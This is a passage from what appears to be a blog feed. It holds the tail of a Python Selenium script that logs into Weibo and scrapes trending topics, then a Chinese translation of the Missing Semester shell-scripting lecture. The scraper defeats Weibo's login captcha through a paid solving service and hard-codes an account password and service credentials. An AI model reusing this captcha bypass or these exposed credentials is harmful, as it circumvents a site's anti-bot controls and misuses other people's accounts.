休息5秒</span><br><br><span class="hljs-comment"># 2.自动模拟输入账号密码，也可以把上面休息时间设置为30秒后手动登录</span><br>browser.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;loginname&quot;]&#x27;</span>).send_keys(<span class="hljs-string">&#x27;0019177650305&#x27;</span>)  <span class="hljs-comment"># 输入账号</span><br>browser.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_login_form&quot;]/div/div[3]/div[2]/div/input&#x27;</span>).send_keys(<span class="hljs-string">&#x27;syhsye595&#x27;</span>)  <span class="hljs-comment"># 输入密码</span><br>time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 3.破解验证码，详细讲解请参考本书第10章</span><br><span class="hljs-keyword">try</span>:<br>    browser.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_login_form&quot;]/div/div[3]/div[3]/a/img&#x27;</span>).screenshot(<span class="hljs-string">&#x27;weibo.png&#x27;</span>)  <span class="hljs-comment"># 获取验证码截图</span><br>    chaojiying = Chaojiying_Client(<span class="hljs-string">&#x27;fgwyt123&#x27;</span>, <span class="hljs-string">&#x27;wyt941025&#x27;</span>, <span class="hljs-string">&#x27;96001&#x27;</span>)  <span class="hljs-comment"># 连接超级鹰远程服务</span><br>    im = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;weibo.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()  <span class="hljs-comment"># 打开刚刚保存的图片验证码</span><br>    code = chaojiying.PostPic(im, <span class="hljs-number">1902</span>)[<span class="hljs-string">&#x27;pic_str&#x27;</span>]  <span class="hljs-comment"># 识别图片验证码</span><br>    <span class="hljs-built_in">print</span>(code)  <span class="hljs-comment"># 打印破解结果</span><br>    browser.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_login_form&quot;]/div/div[3]/div[3]/div/input&#x27;</span>).send_keys(code)  <span class="hljs-comment"># 在验证码输入框中输入破解的验证码</span><br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;无验证码&#x27;</span>)  <span class="hljs-comment"># 偶尔会没有验证码，所以写个try except以防万一</span><br><br><span class="hljs-comment"># 4.点击登录按钮</span><br>time.sleep(<span class="hljs-number">1</span>)<br>browser.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_login_form&quot;]/div/div[3]/div[6]/a&#x27;</span>).click()  <span class="hljs-comment"># 点击登录按钮</span><br><br><span class="hljs-comment"># 5.获取Cookie</span><br>cookies = browser.get_cookies()<br><br><span class="hljs-comment"># 6.Cookie数据处理</span><br>cookie_dict = &#123;&#125;<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> cookies:<br>    cookie_dict[item[<span class="hljs-string">&#x27;name&#x27;</span>]] = item[<span class="hljs-string">&#x27;value&#x27;</span>]<br><br><span class="hljs-comment"># 7.访问微博热搜</span><br>url = <span class="hljs-string">&#x27;http://s.weibo.com/top/summary?cate=realtimehot&#x27;</span><br>res = requests.get(url, headers=headers, cookies=cookie_dict).text<br><br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;华小萌AI&#x27;</span> <span class="hljs-keyword">in</span> res:  <span class="hljs-comment"># 通过判断账号名是否在访问的网页中判断登录是否成功</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;登录成功&#x27;</span>)<br><br><span class="hljs-comment"># 8.编写正则，提取数据</span><br>p_title = <span class="hljs-string">&#x27;&lt;td class=&quot;td-02&quot;&gt;.*?&gt;(.*?)&lt;/a&gt;&#x27;</span><br>p_hot = <span class="hljs-string">&#x27;&lt;td class=&quot;td-02&quot;&gt;.*?&lt;span&gt;(.*?)&lt;/span&gt;&#x27;</span><br>title = re.findall(p_title, res, re.S)<br>hot = re.findall(p_hot, res, re.S)<br><br>title = title[<span class="hljs-number">1</span>:]  <span class="hljs-comment"># 从第二条标题开始提取</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(title)):<br>    <span class="hljs-built_in">print</span>(title[i], hot[i])  <span class="hljs-comment"># 通过逗号可以同时打印多个变量</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>网络爬虫案例实战</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lecture 2:Shell Tools and Scripting</title>
    <link href="/2023/12/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/The%20Missing%20Semester%20of%20Your%20CS%20Education/Shell%20Tools%20and%20Scripting/"/>
    <url>/2023/12/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/The%20Missing%20Semester%20of%20Your%20CS%20Education/Shell%20Tools%20and%20Scripting/</url>
    
    <content type="html"><![CDATA[<h1 id="shell-脚本">Shell 脚本</h1><p>到目前为止，我们已经学习来如何在 shell中执行命令，并使用管道将命令组合使用。但是，很多情况下我们需要执行一系列的操作并使用条件或循环这样的控制流。</p><p>shell 脚本是一种更加复杂的工具。</p><p>大多数shell都有自己的一套脚本语言，包括变量、控制流和自己的语法。shell脚本与其他脚本语言不同之处在于，shell脚本针对 shell所从事的相关工作进行来优化。因此，创建命令流程（pipelines）、将结果保存到文件、从标准输入中读取输入，这些都是shell脚本中的原生操作，这让它比通用的脚本语言更易用。本节中，我们会专注于bash 脚本，因为它最流行，应用更为广泛。</p><p>在bash中为变量赋值的语法是<code>foo=bar</code>，访问变量中存储的数值，其语法为<code>$foo</code>。 需要注意的是，<code>foo = bar</code>（使用空格隔开）是不能正确工作的，因为解释器会调用程序<code>foo</code>并将 <code>=</code> 和 <code>bar</code>作为参数。总的来说，在shell脚本中使用空格会起到分割参数的作用，有时候可能会造成混淆，请务必多加检查。</p><p>Bash中的字符串通过<code>'</code> 和<code>"</code>分隔符来定义，但是它们的含义并不相同。以<code>'</code>定义的字符串为原义字符串，其中的变量不会被转义，而<code>"</code>定义的字符串会将变量值进行替换。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">foo=bar<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$foo</span>&quot;</span><br><span class="hljs-comment"># 打印 bar</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$foo&#x27;</span><br><span class="hljs-comment"># 打印 $foo</span><br></code></pre></td></tr></table></figure><p>和其他大多数的编程语言一样，<code>bash</code>也支持<code>if</code>,<code>case</code>, <code>while</code> 和 <code>for</code>这些控制流关键字。同样地， <code>bash</code>也支持函数，它可以接受参数并基于参数进行操作。下面这个函数是一个例子，它会创建一个文件夹并使用<code>cd</code>进入该文件夹。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-function"><span class="hljs-title">mcd</span></span> () &#123;<br>    <span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>    <span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里 <code>$1</code>是脚本的第一个参数。与其他脚本语言不同的是，bash使用了很多特殊的变量来表示参数、错误代码和相关变量。下面是列举来其中一些变量：</p><ul><li><code>$0</code> - 脚本名</li><li><code>$1</code> 到 <code>$9</code> - 脚本的参数。 <code>$1</code>是第一个参数，依此类推。</li><li><code>$@</code> - 所有参数</li><li><code>$#</code> - 参数个数</li><li><code>$?</code> - 前一个命令的返回值</li><li><code>$$</code> - 当前脚本的进程识别码</li><li><code>!!</code> -完整的上一条命令，包括参数。常见应用：当你因为权限不足执行命令失败时，可以使用<code>sudo !!</code>再尝试一次。</li><li><code>$_</code> - 上一条命令的最后一个参数。如果你正在使用的是交互式shell，你可以通过按下 <code>Esc</code> 之后键入 . 来获取这个值。</li></ul><p>命令通常使用 <code>STDOUT</code>来返回输出值，使用<code>STDERR</code>来返回错误及错误码，便于脚本以更加友好的方式报告错误。返回码或退出状态是脚本/命令之间交流执行状态的方式。返回值0表示正常执行，其他所有非0的返回值都表示有错误发生。</p><p>退出码可以搭配 <code>&amp;&amp;</code>（与操作符）和<code>||</code>（或操作符）使用，用来进行条件判断，决定是否执行其他程序。它们都属于短路运算符（short-circuiting），即如果第一条命令错误，第二条命令就不会执行。同一行的多个命令可以用<code>;</code>分隔。程序 <code>true</code>的返回码永远是<code>0</code>，<code>false</code>的返回码永远是<code>1</code>。让我们看几个例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-literal">false</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Oops, fail&quot;</span><br><span class="hljs-comment"># Oops, fail</span><br><br><span class="hljs-literal">true</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Will not be printed&quot;</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-literal">true</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Things went well&quot;</span><br><span class="hljs-comment"># Things went well</span><br><br><span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Will not be printed&quot;</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-literal">false</span> ; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This will always run&quot;</span><br><span class="hljs-comment"># This will always run</span><br></code></pre></td></tr></table></figure><p>另一个常见的模式是以变量的形式获取一个命令的输出，这可以通过<em>命令替换</em>（<em>command substitution</em>）实现。</p><p>当您通过 <code>$( CMD )</code> 这样的方式来执行<code>CMD</code>这个命令时，它的输出结果会替换掉 <code>$( CMD )</code> 。例如，如果执行<code>for file in $(ls)</code> ，shell首先将调用<code>ls</code>，然后遍历得到的这些返回值。还有一个冷门的类似特性是<em>进程替换</em>（<em>process substitution</em>），<code>&lt;( CMD )</code> 会执行 <code>CMD</code>并将结果输出到一个临时文件中，并将 <code>&lt;( CMD )</code>替换成临时文件名。这在我们希望返回值通过文件而不是STDIN传递时很有用。例如，<code>diff &lt;(ls foo) &lt;(ls bar)</code> 会显示文件夹<code>foo</code> 和 <code>bar</code> 中文件的区别。</p><p>说了很多，现在该看例子了，下面这个例子展示了一部分上面提到的特性。这段脚本会遍历我们提供的参数，使用<code>grep</code>搜索字符串<code>foobar</code>，如果没有找到，则将其作为注释追加到文件中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Starting program at <span class="hljs-subst">$(date)</span>&quot;</span> <span class="hljs-comment"># date会被替换成日期和时间</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Running program <span class="hljs-variable">$0</span> with <span class="hljs-variable">$#</span> arguments with pid $$&quot;</span><br><br><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span>; <span class="hljs-keyword">do</span><br>    grep foobar <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> &gt; /dev/null 2&gt; /dev/null<br>    <span class="hljs-comment"># 如果模式没有找到，则grep退出状态为 1</span><br>    <span class="hljs-comment"># 我们将标准输出流和标准错误流重定向到Null，因为我们并不关心这些信息</span><br>    <span class="hljs-keyword">if</span> [[ $? -ne 0 ]]; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;File <span class="hljs-variable">$file</span> does not have any foobar, adding one&quot;</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;# foobar&quot;</span> &gt;&gt; <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>在条件语句中，我们比较 <code>$?</code> 是否等于0。Bash实现了许多类似的比较操作，您可以查看 <ahref="https://man7.org/linux/man-pages/man1/test.1.html"><code>test 手册</code></a>。在bash中进行比较时，尽量使用双方括号 <code>[[ ]]</code> 而不是单方括号<code>[ ]</code>，这样会降低犯错的几率，尽管这样并不能兼容<code>sh</code>。</p><p>当执行脚本时，我们经常需要提供形式类似的参数。bash使我们可以轻松的实现这一操作，它可以基于文件扩展名展开表达式。这一技术被称为shell的<em>通配</em>（<em>globbing</em>）</p><ul><li>通配符 - 当你想要利用通配符进行匹配时，你可以分别使用 <code>?</code>和 <code>*</code>来匹配一个或任意个字符。例如，对于文件<code>foo</code>,<code>foo1</code>, <code>foo2</code>, <code>foo10</code> 和<code>bar</code>, <code>rm foo?</code>这条命令会删除<code>foo1</code> 和<code>foo2</code> ，而<code>rm foo*</code>则会删除除了<code>bar</code>之外的所有文件。</li><li>花括号<code>&#123;&#125;</code> -当你有一系列的指令，其中包含一段公共子串时，可以用花括号来自动展开这些命令。这在批量移动或转换文件时非常方便。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">convert image.&#123;png,jpg&#125;<br><span class="hljs-comment"># 会展开为</span><br>convert image.png image.jpg<br><br><span class="hljs-built_in">cp</span> /path/to/project/&#123;foo,bar,baz&#125;.sh /newpath<br><span class="hljs-comment"># 会展开为</span><br><span class="hljs-built_in">cp</span> /path/to/project/foo.sh /path/to/project/bar.sh /path/to/project/baz.sh /newpath<br><br><span class="hljs-comment"># 也可以结合通配使用</span><br><span class="hljs-built_in">mv</span> *&#123;.py,.sh&#125; folder<br><span class="hljs-comment"># 会移动所有 *.py 和 *.sh 文件</span><br><br><span class="hljs-built_in">mkdir</span> foo bar<br><br><span class="hljs-comment"># 下面命令会创建foo/a, foo/b, ... foo/h, bar/a, bar/b, ... bar/h这些文件</span><br><span class="hljs-built_in">touch</span> &#123;foo,bar&#125;/&#123;a..h&#125;<br><span class="hljs-built_in">touch</span> foo/x bar/y<br><span class="hljs-comment"># 比较文件夹 foo 和 bar 中包含文件的不同</span><br>diff &lt;(<span class="hljs-built_in">ls</span> foo) &lt;(<span class="hljs-built_in">ls</span> bar)<br><span class="hljs-comment"># 输出</span><br><span class="hljs-comment"># &lt; x</span><br><span class="hljs-comment"># ---</span><br><span class="hljs-comment"># &gt; y</span><br></code></pre></td></tr></table></figure><p>编写 <code>bash</code> 脚本有时候会很别扭和反直觉。例如 <ahref="https://github.com/koalaman/shellcheck">shellcheck</a>这样的工具可以帮助你定位sh/bash脚本中的错误。</p><p>注意，脚本并不一定只有用 bash 写才能在终端里调用。比如说，这是一段Python 脚本，作用是将输入的参数倒序输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/local/bin/python</span><br>import sys<br><span class="hljs-keyword">for</span> arg <span class="hljs-keyword">in</span> reversed(sys.argv[1:]):<br>    <span class="hljs-built_in">print</span>(arg)<br></code></pre></td></tr></table></figure><p>内核知道去用 python 解释器而不是 shell命令来运行这段脚本，是因为脚本的开头第一行的 <ahref="https://en.wikipedia.org/wiki/Shebang_(Unix)">shebang</a>。</p><p>在 <code>shebang</code> 行中使用 <ahref="https://man7.org/linux/man-pages/man1/env.1.html"><code>env</code></a>命令是一种好的实践，它会利用环境变量中的程序来解析该脚本，这样就提高来您的脚本的可移植性。<code>env</code>会利用我们第一节讲座中介绍过的<code>PATH</code> 环境变量来进行定位。例如，使用了<code>env</code>的shebang看上去是这样的<code>#!/usr/bin/env python</code>。</p><p>shell函数和脚本有如下一些不同点：</p><ul><li>函数只能与shell使用相同的语言，脚本可以使用任意语言。因此在脚本中包含<code>shebang</code> 是很重要的。</li><li>函数仅在定义时被加载，脚本会在每次被执行时加载。这让函数的加载比脚本略快一些，但每次修改函数定义，都要重新加载一次。</li><li>函数会在当前的shell环境中执行，脚本会在单独的进程中执行。因此，函数可以对环境变量进行更改，比如改变当前工作目录，脚本则不行。脚本需要使用<ahref="https://man7.org/linux/man-pages/man1/export.1p.html"><code>export</code></a>将环境变量导出，并将值传递给环境变量。</li><li>与其他程序语言一样，函数可以提高代码模块性、代码复用性并创建清晰性的结构。shell脚本中往往也会包含它们自己的函数定义。</li></ul><h1 id="shell-工具">Shell 工具</h1><h2 id="查看命令如何使用">查看命令如何使用</h2><p>看到这里，您可能会有疑问，我们应该如何为特定的命令找到合适的标记呢？例如<code>ls -l</code>, <code>mv -i</code> 和<code>mkdir -p</code>。更普遍的是，给您一个命令行，您应该怎样了解如何使用这个命令行并找出它的不同的选项呢？一般来说，您可能会先去网上搜索答案，但是，UNIX 可比 StackOverflow出现的早，因此我们的系统里其实早就包含了可以获取相关信息的方法。</p><p>在上一节中我们介绍过，最常用的方法是为对应的命令行添加<code>-h</code>或 <code>--help</code>标记。另外一个更详细的方法则是使用<code>man</code> 命令。<ahref="https://man7.org/linux/man-pages/man1/man.1.html"><code>man</code></a>命令是手册（manual）的缩写，它提供了命令的用户手册。</p><p>例如，<code>man rm</code> 会输出命令 <code>rm</code>的说明，同时还有其标记列表，包括之前我们介绍过的<code>-i</code>。事实上，目前我们给出的所有命令的说明链接，都是网页版的Linux命令手册。即使是您安装的第三方命令，前提是开发者编写了手册并将其包含在了安装包中。在交互式的、基于字符处理的终端窗口中，一般也可以通过<code>:help</code> 命令或键入 <code>?</code> 来获取帮助。</p><p>有时候手册内容太过详实，让我们难以在其中查找哪些最常用的标记和语法。<a href="https://tldr.sh/">TLDR pages</a>是一个很不错的替代品，它提供了一些案例，可以帮助您快速找到正确的选项。</p><p>例如，自己就常常在tldr上搜索<ahref="https://tldr.ostera.io/tar"><code>tar</code></a> 和 <ahref="https://tldr.ostera.io/ffmpeg"><code>ffmpeg</code></a>的用法。</p><h2 id="查找文件">查找文件</h2><p>程序员们面对的最常见的重复任务就是查找文件或目录。所有的类UNIX系统都包含一个名为<ahref="https://man7.org/linux/man-pages/man1/find.1.html"><code>find</code></a>的工具，它是 shell上用于查找文件的绝佳工具。<code>find</code>命令会递归地搜索符合条件的文件，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查找所有名称为src的文件夹</span><br>find . -name src -<span class="hljs-built_in">type</span> d<br><span class="hljs-comment"># 查找所有文件夹路径中包含test的python文件</span><br>find . -path <span class="hljs-string">&#x27;*/test/*.py&#x27;</span> -<span class="hljs-built_in">type</span> f<br><span class="hljs-comment"># 查找前一天修改的所有文件</span><br>find . -mtime -1<br><span class="hljs-comment"># 查找所有大小在500k至10M的tar.gz文件</span><br>find . -size +500k -size -10M -name <span class="hljs-string">&#x27;*.tar.gz&#x27;</span><br></code></pre></td></tr></table></figure><p>除了列出所寻找的文件之外，find还能对所有查找到的文件进行操作。这能极大地简化一些单调的任务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 删除全部扩展名为.tmp 的文件</span><br>find . -name <span class="hljs-string">&#x27;*.tmp&#x27;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> &#123;&#125; \;<br><span class="hljs-comment"># 查找全部的 PNG 文件并将其转换为 JPG</span><br>find . -name <span class="hljs-string">&#x27;*.png&#x27;</span> -<span class="hljs-built_in">exec</span> convert &#123;&#125; &#123;&#125;.jpg \;<br></code></pre></td></tr></table></figure><p>尽管 <code>find</code>用途广泛，它的语法却比较难以记忆。例如，为了查找满足模式<code>PATTERN</code> 的文件，您需要执行<code>find -name '*PATTERN*'</code>(如果您希望模式匹配时是不区分大小写，可以使用<code>-iname</code>选项）</p><p>您当然可以使用 alias 设置别名来简化上述操作，但 shell的哲学之一便是寻找（更好用的）替代方案。 记住，shell最好的特性就是您只是在调用程序，因此您只要找到合适的替代程序即可（甚至自己编写）。</p><p>例如，<a href="https://github.com/sharkdp/fd"><code>fd</code></a>就是一个更简单、更快速、更友好的程序，它可以用来作为<code>find</code>的替代品。它有很多不错的默认设置，例如输出着色、默认支持正则匹配、支持unicode并且我认为它的语法更符合直觉。以模式<code>PATTERN</code>搜索的语法是 <code>fd PATTERN</code>。</p><p>大多数人都认为 <code>find</code> 和 <code>fd</code>已经很好用了，但是有的人可能想知道，我们是不是可以有更高效的方法，例如不要每次都搜索文件而是通过编译索引或建立数据库的方式来实现更加快速地搜索。</p><p>这就要靠 <ahref="https://man7.org/linux/man-pages/man1/locate.1.html"><code>locate</code></a>了。 <code>locate</code> 使用一个由 <ahref="https://man7.org/linux/man-pages/man1/updatedb.1.html"><code>updatedb</code></a>负责更新的数据库，在大多数系统中<code>updatedb</code> 都会通过 <ahref="https://man7.org/linux/man-pages/man8/cron.8.html"><code>cron</code></a>每日更新。这便需要我们在速度和时效性之间作出权衡。而且，<code>find</code>和类似的工具可以通过别的属性比如文件大小、修改时间或是权限来查找文件，<code>locate</code>则只能通过文件名。<ahref="https://unix.stackexchange.com/questions/60205/locate-vs-find-usage-pros-and-cons-of-each-other">这里</a>有一个更详细的对比。</p><h2 id="查找代码">查找代码</h2><p>查找文件是很有用的技能，但是很多时候您的目标其实是查看文件的内容。一个最常见的场景是您希望查找具有某种模式的全部文件，并找它们的位置。</p><p>为了实现这一点，很多类UNIX的系统都提供了<ahref="https://man7.org/linux/man-pages/man1/grep.1.html"><code>grep</code></a>命令，它是用于对输入文本进行匹配的通用工具。它是一个非常重要的shell工具，我们会在后续的数据清理课程中深入的探讨它。</p><p><code>grep</code>有很多选项，这也使它成为一个非常全能的工具。其中我经常使用的有<code>-C</code> ：获取查找结果的上下文（Context）；<code>-v</code>将对结果进行反选（Invert），也就是输出不匹配的结果。举例来说，<code>grep -C 5</code>会输出匹配结果前后五行。当需要搜索大量文件的时候，使用 <code>-R</code>会递归地进入子目录并搜索所有的文本文件。</p><p>但是，我们有很多办法可以对 <code>grep -R</code>进行改进，例如使其忽略<code>.git</code> 文件夹，使用多CPU等等。</p><p>因此也出现了很多它的替代品，包括 <ahref="https://beyondgrep.com/">ack</a>, <ahref="https://github.com/ggreer/the_silver_searcher">ag</a> 和 <ahref="https://github.com/BurntSushi/ripgrep">rg</a>。它们都特别好用，但是功能也都差不多，我比较常用的是ripgrep (<code>rg</code>)，因为它速度快，而且用法非常符合直觉。例子如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查找所有使用了 requests 库的文件</span><br>rg -t py <span class="hljs-string">&#x27;import requests&#x27;</span><br><span class="hljs-comment"># 查找所有没有写 shebang 的文件（包含隐藏文件）</span><br>rg -u --files-without-match <span class="hljs-string">&quot;^#!&quot;</span><br><span class="hljs-comment"># 查找所有的foo字符串，并打印其之后的5行</span><br>rg foo -A 5<br><span class="hljs-comment"># 打印匹配的统计信息（匹配的行和文件的数量）</span><br>rg --stats PATTERN<br></code></pre></td></tr></table></figure><p>与 <code>find</code>/<code>fd</code>一样，重要的是你要知道有些问题使用合适的工具就会迎刃而解，而具体选择哪个工具则不是那么重要。</p><h2 id="查找-shell-命令">查找 shell 命令</h2><p>目前为止，我们已经学习了如何查找文件和代码，但随着你使用shell的时间越来越久，您可能想要找到之前输入过的某条命令。首先，按向上的方向键会显示你使用过的上一条命令，继续按上键则会遍历整个历史记录。</p><p><code>history</code>命令允许您以程序员的方式来访问shell中输入的历史命令。这个命令会在标准输出中打印shell中的里面命令。如果我们要搜索历史记录，则可以利用管道将输出结果传递给<code>grep</code> 进行模式搜索。 <code>history | grep find</code>会打印包含find子串的命令。</p><p>对于大多数的shell来说，您可以使用 <code>Ctrl+R</code>对命令历史记录进行回溯搜索。敲 <code>Ctrl+R</code>后您可以输入子串来进行匹配，查找历史命令行。</p><p>反复按下就会在所有搜索结果中循环。在 <ahref="https://github.com/zsh-users/zsh-history-substring-search">zsh</a>中，使用方向键上或下也可以完成这项工作。</p><p><code>Ctrl+R</code> 可以配合 <ahref="https://github.com/junegunn/fzf/wiki/Configuring-shell-key-bindings#ctrl-r">fzf</a>使用。<code>fzf</code>是一个通用对模糊查找工具，它可以和很多命令一起使用。这里我们可以对历史命令进行模糊查找并将结果以赏心悦目的格式输出。</p><p>另外一个和历史命令相关的技巧我喜欢称之为<strong>基于历史的自动补全</strong>。这一特性最初是由 <a href="https://fishshell.com/">fish</a> shell创建的，它可以根据您最近使用过的开头相同的命令，动态地对当前对shell命令进行补全。这一功能在<a href="https://github.com/zsh-users/zsh-autosuggestions">zsh</a>中也可以使用，它可以极大的提高用户体验。</p><p>你可以修改 shell history的行为，例如，如果在命令的开头加上一个空格，它就不会被加进shell记录中。当你输入包含密码或是其他敏感信息的命令时会用到这一特性。为此你需要在<code>.bashrc</code>中添加<code>HISTCONTROL=ignorespace</code>或者向<code>.zshrc</code>添加 <code>setopt HIST_IGNORE_SPACE</code>。如果你不小心忘了在前面加空格，可以通过编辑。<code>bash_history</code>或<code>.zhistory</code> 来手动地从历史记录中移除那一项。</p><h2 id="文件夹导航">文件夹导航</h2><p>之前对所有操作我们都默认一个前提，即您已经位于想要执行命令的目录下，但是如何才能高效地在目录间随意切换呢？有很多简便的方法可以做到，比如设置alias，使用 <ahref="https://man7.org/linux/man-pages/man1/ln.1.html">ln -s</a>创建符号连接等。而开发者们已经想到了很多更为精妙的解决方案。</p><p>由于本课程的目的是尽可能对你的日常习惯进行优化。因此，我们可以使用<ahref="https://github.com/clvv/fasd"><code>fasd</code></a>和 <ahref="https://github.com/wting/autojump">autojump</a>这两个工具来查找最常用或最近使用的文件和目录。</p><p>Fasd 基于 <ahref="https://developer.mozilla.org/en-US/docs/Mozilla/Tech/Places/Frecency_algorithm"><em>frecency</em></a>对文件和文件排序，也就是说它会同时针对频率（<em>frequency</em>）和时效（<em>recency</em>）进行排序。默认情况下，<code>fasd</code>使用命令<code>z</code> 帮助我们快速切换到最常访问的目录。例如，如果您经常访问<code>/home/user/files/cool_project</code>目录，那么可以直接使用 <code>z cool</code> 跳转到该目录。对于autojump，则使用<code>j cool</code>代替即可。</p><p>还有一些更复杂的工具可以用来概览目录结构，例如 <ahref="https://linux.die.net/man/1/tree"><code>tree</code></a>, <ahref="https://github.com/Canop/broot"><code>broot</code></a>或更加完整的文件管理器，例如 <ahref="https://github.com/jarun/nnn"><code>nnn</code></a> 或 <ahref="https://github.com/ranger/ranger"><code>ranger</code></a>。</p><p>参考教程：</p><ol type="1"><li>https://missing-semester-cn.github.io/2020/shell-tools/</li><li>https://missing-semester-cn.github.io/missing-notes-and-solutions/2020/solutions/shell-tools-solution/</li><li>https://www.youtube.com/watch?v=kgII-YWo3Zw</li></ol>]]></content>
    
    
    <categories>
      
      <category>计算机核心课程</category>
      
      <category>The Missing Semester of Your CS Education</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lecture 1:The Shell</title>
    <link href="/2023/12/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/The%20Missing%20Semester%20of%20Your%20CS%20Education/The%20Shell/"/>
    <url>/2023/12/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/The%20Missing%20Semester%20of%20Your%20CS%20Education/The%20Shell/</url>
    
